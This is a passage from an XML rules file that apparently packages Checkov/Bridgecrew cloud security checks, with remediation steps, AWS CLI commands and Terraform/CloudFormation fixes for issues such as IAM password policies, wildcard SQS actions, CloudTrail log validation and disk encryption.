<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_dms_replication_instance</li>
<li><strong>Argument:</strong> publicly_accessible - (Optional, Default: false) Specifies the accessibility options for the replication instance. A value of true represents an instance with a public IP address. A value of false represents an instance with a private IP address.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dms_replication_instance" "test" {
  ...
  allocated_storage            = 20
+ publicly_accessible          = false
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::DMS::ReplicationInstance</li>
<li><strong>Argument:</strong> Properties.PubliclyAccessible - (Optional, Default: false) Specifies the accessibility options for the replication instance. A value of true represents an instance with a public IP address. A value of false represents an instance with a private IP address.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ReplicationInstance:
    Type: AWS::DMS::ReplicationInstance
    Properties: 
        ...
+     PubliclyAccessible: False
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_13' target='_blank'> https://docs.bridgecrew.io/docs/public_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_14</key>
    <name>Ensure unattached disks are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="unattached-disks-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-unattached-disks-are-not-encrypted"></div>Unattached disks are not encrypted</div><a aria-label="Skip link to Unattached disks are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#unattached-disks-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_managed_disk, azurerm_virtual_machine</li>
<li><strong>Argument:</strong> encryption_settings.encrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "group" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_managed_disk" "managed_disk_good_1" {
  name                 = "acctestmd"
  location             = "West US 2"
  resource_group_name  = azurerm_resource_group.group.name
  storage_account_type = "Standard_LRS"
  create_option        = "Empty"
  disk_size_gb         = "1"

+ encryption_settings {
+   enabled = true
  }
  tags = {
    environment = "staging"
  }
}



resource "azurerm_virtual_machine" "virtual_machine_good_1" {
  name                  = "$vm"
  location              = "location"
  resource_group_name  = azurerm_resource_group.group.name
  network_interface_ids = ["id"]
  vm_size               = "Standard_DS1_v2"
  storage_image_reference {
    publisher = "Canonical"
    offer     = "UbuntuServer"
    sku       = "16.04-LTS"
    version   = "latest"
  }
  storage_os_disk {
    name              = "myosdisk1"
    caching           = "ReadWrite"
    create_option     = "FromImage"
    managed_disk_id = azurerm_managed_disk.managed_disk_good_1.id
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-unattached-disks-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-unattached-disks-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-unattached-disks-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_13</key>
    <name>Ensure AWS IAM password policy does not allow password reuse</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-allows-password-reuse"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-allows-password-reuse"></div>AWS IAM password policy allows password reuse</div><a aria-label="Skip link to AWS IAM password policy allows password reuse" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-allows-password-reuse"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy must prevent reuse of passwords. Each password should be brand new to increase security, especially from a brute force attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Select <strong>Prevent password reuse</strong>.</li>
<li>For <strong>Number of passwords to remember" enter </strong>24**. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the password policy, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --password-reuse-prevention 24
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/iam_10' target='_blank'> https://docs.bridgecrew.io/docs/iam_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_9</key>
    <name>Ensure AWS IAM password policy expires in 90 days or less</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-does-not-expire-in-90-days"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-does-not-expire-in-90-days"></div>AWS IAM password policy does not expire in 90 days</div><a aria-label="Skip link to AWS IAM password policy does not expire in 90 days" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-does-not-expire-in-90-days"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy should require passwords to be rotated or expired within a specified timeframe, we recommend passwords expire after 90 days or less. </p>
<p>Reducing the lifetime of a password by enforcing regular password changes increases account resilience towards:</p>
<ul>
<li>Brute force attack;</li>
<li>Passwords being stolen or compromised, sometimes without your knowledge;</li>
<li>Web filters and proxy servers intercepting and recording traffic, including encrypted data;</li>
<li>Use of the same user password across work, email, and personal systems; and</li>
<li>End user workstations compromised by a keystroke logger. </li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, use the following command:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Select <strong>Enable password expiration </strong>.</li>
<li>For <strong>Password expiration period (in days)" enter </strong>90** or less. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Change the password policy using CLI command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --max-password-age 90
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/iam_11' target='_blank'> https://docs.bridgecrew.io/docs/iam_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_1</key>
    <name>Ensure IAM policies that allow full administrative privileges are not created</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-policies-that-allow-full-administrative-privileges-are-created"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-policies-that-allow-full-administrative-privileges-are-created"></div>IAM policies that allow full administrative privileges are created</div><a aria-label="Skip link to IAM policies that allow full administrative privileges are created" class="heading-anchor-icon fa fa-anchor" href="#iam-policies-that-allow-full-administrative-privileges-are-created"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>IAM policies are the means by which privileges are granted to users, groups, and roles. Standard security practice is to grant <em>least privilege</em>&#8218; this is granting only the permissions required to perform a task. Providing full administrative may expose resources to potentially unwanted actions.<br/>
We recommend:</p>
<ul>
<li>You determine what users need to do, then craft policies allowing them to perform only those tasks. </li>
<li>You do not allow all users full administrative privileges. </li>
<li>You start with a minimum set of permissions and grant additional permissions as necessary.</li>
<li>IAM policies that have a statement with Effect: Allow with Action: <em> over Resource: </em> are removed. </li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To detach the policy that has full administrative privileges, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/iam/" target="_self">Amazon IAM console</a>.</li>
<li>In the navigation pane, click <strong>Policies</strong> and then search for the policy name found in the audit step. </li>
<li>Select the policy to be deleted.</li>
<li>In the <strong>Policy Action </strong>menu, select <strong>first Detach</strong>.</li>
<li>Select all Users, Groups, and Roles that have this policy attached.</li>
<li>Click <strong>Detach Policy</strong>. </li>
<li>In the <strong>Policy Action </strong>menu, select <strong>Detach</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To detach the policy that has full administrative privileges as found in the audit step, use the following commands:</p>
<ol>
<li>Lists all IAM users, groups, and roles that the specified managed policy is attached to. </li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam list-entities-for-policy --policy-arn &lt;policy_arn&gt;
</code></pre>
<ol start="2">
<li>Detach the policy from all IAM Users. </li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">   aws iam detach-user-policy --user-name &lt;iam_user&gt; --policy-arn &lt;policy_arn&gt; 
</code></pre>
<ol start="3">
<li>Detach the policy from all IAM Groups.</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">   aws iam detach-group-policy --group-name &lt;iam_group&gt; --policy-arn &lt;policy_arn&gt; 
</code></pre>
<ol start="4">
<li>Detach the policy from all IAM Roles.</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">   aws iam detach-role-policy --role-name &lt;iam_role&gt; --policy-arn &lt;policy_arn&gt;
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/iam_23' target='_blank'> https://docs.bridgecrew.io/docs/iam_23</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_23' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_72</key>
    <name>Ensure SQS policy documents do not allow * (asterisk) as a statement's action</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sqs-policy-documents-allow--asterisk-as-a-statements-action"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sqs-policy-documents-allow-asterisk-as-a-statements-action"></div>SQS policy documents allow * (asterisk) as a statement's action</div><a aria-label="Skip link to SQS policy documents allow * (asterisk) as a statement's action" class="heading-anchor-icon fa fa-anchor" href="#sqs-policy-documents-allow--asterisk-as-a-statements-action"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Action element describes the specific action or actions that will be allowed or denied. Statements must include either an Action or NotAction element. Each AWS service has its own set of actions that describe tasks that can be performed with that service. Specify a value using a namespace that identifies a service, for example, iam, ec2 sqs, sns, s3, followed by the name of the action to be allowed or denied. The name must match an action that is supported by the service.</p>
<p>We recommend you do not allow "*" (all resource) statements as part of action elements. This level of access could potentially grant unwanted and unregulated access to anyone given this policy document setting. We recommend you to write a refined policy describing the specific action allowed or required by the specific policy holder.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/sqs/v2/home" target="_self">Amazon SQS console</a>.</li>
<li>Click on the queue you want to modify.</li>
<li>Click on the "Access Policy" tab within the queue's details page.</li>
<li>Click "edit" next to the displayed "Access Policy".</li>
<li>Identify any Action statements permitting actions access to all resources ("*").</li>
<li>Narrow the scope to necessary actions, for example <strong>sqs:SendMessage</strong></li>
<li>Click <strong>Save</strong>.<br/>
#Fix - Buildtime<br/>
##Terraform</li>
</ol>
<ul>
<li><strong>Argument</strong>: statement</li>
<li><strong>Attribute</strong>: action </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_iam_policy</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_iam_policy">resource "aws_sqs_queue_policy" "example" {
  queue_url = aws_sqs_queue.q.id

  policy = &lt;&lt;POLICY
  {
  "Version": "2012-10-17",
  "Id": "sqspolicy",
  "Statement": [
      {
      "Sid": "First",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "sqs:SendMessage",
      "Resource": "${aws_sqs_queue.q.arn}",
      "Condition": {
          "ArnEquals": {
          "aws:SourceArn": "${aws_sns_topic.example.arn}"
          }
      }
      }
  ]
  }
  POLICY
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_iam_46' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_iam_46</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_iam_46' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_36</key>
    <name>Ensure AWS CloudTrail log validation is enabled in all regions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudtrail-log-validation-is-not-enabled-in-all-regions"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-trail-log-validation-is-not-enabled-in-all-regions"></div>AWS CloudTrail log validation is not enabled in all regions</div><a aria-label="Skip link to AWS CloudTrail log validation is not enabled in all regions" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudtrail-log-validation-is-not-enabled-in-all-regions"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>CloudTrail log file validation creates a digitally signed digest file containing a hash of each log that CloudTrail writes to S3. These digest files can be used to determine whether a log file was changed, deleted, or unchanged after CloudTrail delivered the log. It is recommended that file validation be enabled on all CloudTrails. </p>
<p>We recommend enabling log file validation to provide additional integrity checking of CloudTrail logs. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To enable log file validation on a given trail, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/iam/" target="_self">IAM console</a>.</li>
<li>On the left navigation pane, click <strong>Trails</strong>.</li>
<li>Select the target trail. </li>
<li>Navigate to the <strong>S3</strong> section, click the edit icon (pencil). </li>
<li>Click <strong>Advanced</strong>.</li>
<li>In the <strong>Enable log file validation</strong> section, select <strong>Yes</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable log file validation on an AWS CloudTrail, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws cloudtrail update-trail 
--name &lt;trail_name&gt; 
--enable-log-file-validation
</code></pre>
<p>To start periodic validation of logs using these digests, use the following command: </p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws cloudtrail validate-logs 
--trail-arn &lt;trail_arn&gt; 
--start-time &lt;start_time&gt; 
--end-time &lt;end_time&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_cloudtrail</li>
<li><strong>Argument</strong>: enable_log_file_validation - (Optional) Specifies whether log file integrity validation is enabled. Defaults to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudtrail" "trail_1" {
  ...
  name                          = "terraform.env-trail-01"
+ enable_log_file_validation    = true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::CloudTrail::Trail</li>
<li><strong>Argument</strong>: Properties.EnableLogFileValidation</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
   myTrail: 
      Type: AWS::CloudTrail::Trail
      Properties: 
        ...
+       EnableLogFileValidation: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_2' target='_blank'> https://docs.bridgecrew.io/docs/logging_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_16</key>
    <name>Ensure MySQL server enables customer-managed key for encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mysql-server-does-not-enable-customer-managed-key-for-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-server-does-not-enable-customer-managed-key-for-encryption"></div>MySQL server does not enable customer-managed key for encryption</div><a aria-label="Skip link to MySQL server does not enable customer-managed key for encryption" class="heading-anchor-icon fa fa-anchor" href="#mysql-server-does-not-enable-customer-managed-key-for-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use customer-managed keys to manage the encryption at rest of your MySQL servers. By default, the data is encrypted at rest with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group,azurerm_key_vault,  azurerm_key_vault_access_policy, azurerm_key_vault_key, azurerm_mysql_server, azurerm_mysql_server_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "ok" {
  name     = "ok-resources"
  location = "West Europe"
}

resource "azurerm_key_vault" "ok" {
  name                     = "okkv"
  location                 = azurerm_resource_group.ok.location
  resource_group_name      = azurerm_resource_group.ok.name
  tenant_id                = data.azurerm_client_config.current.tenant_id
  sku_name                 = "premium"
  purge_protection_enabled = true
}

resource "azurerm_key_vault_access_policy" "server" {
  key_vault_id       = azurerm_key_vault.ok.id
  tenant_id          = data.azurerm_client_config.current.tenant_id
  object_id          = azurerm_mysql_server.ok.identity.0.principal_id
  key_permissions    = ["get", "unwrapkey", "wrapkey"]
  secret_permissions = ["get"]
}

resource "azurerm_key_vault_access_policy" "client" {
  key_vault_id       = azurerm_key_vault.ok.id
  tenant_id          = data.azurerm_client_config.current.tenant_id
  object_id          = data.azurerm_client_config.current.object_id
  key_permissions    = ["get", "create", "delete", "list", "restore", "recover", "unwrapkey", "wrapkey", "purge", "encrypt", "decrypt", "sign", "verify"]
  secret_permissions = ["get"]
}

resource "azurerm_key_vault_key" "ok" {
  name         = "tfex-key"
  key_vault_id = azurerm_key_vault.ok.id
  key_type     = "RSA"
  key_size     = 2048
  key_opts     = ["decrypt", "encrypt", "sign", "unwrapKey", "verify", "wrapKey"]
  depends_on = [
    azurerm_key_vault_access_policy.client,
    azurerm_key_vault_access_policy.server,
  ]
}

